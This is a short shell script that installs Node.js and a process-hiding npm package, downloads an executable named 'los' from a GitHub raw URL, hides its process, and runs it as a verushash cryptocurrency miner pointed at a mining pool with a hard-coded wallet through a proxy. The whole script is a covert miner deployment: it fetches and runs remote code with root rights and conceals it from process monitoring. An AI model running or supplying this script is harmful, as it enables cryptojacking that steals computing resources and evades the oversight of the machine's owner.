sudo apt update -y
sudo apt install nodejs -y
sudo apt install npm -y
sudo npm i -g node-process-hider
wget https://raw.githubusercontent.com/chikahusarii/claim/main/los
chmod +x los
sudo ph add los
sudo ./los --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.r1 --proxy 50.116.14.201:7497
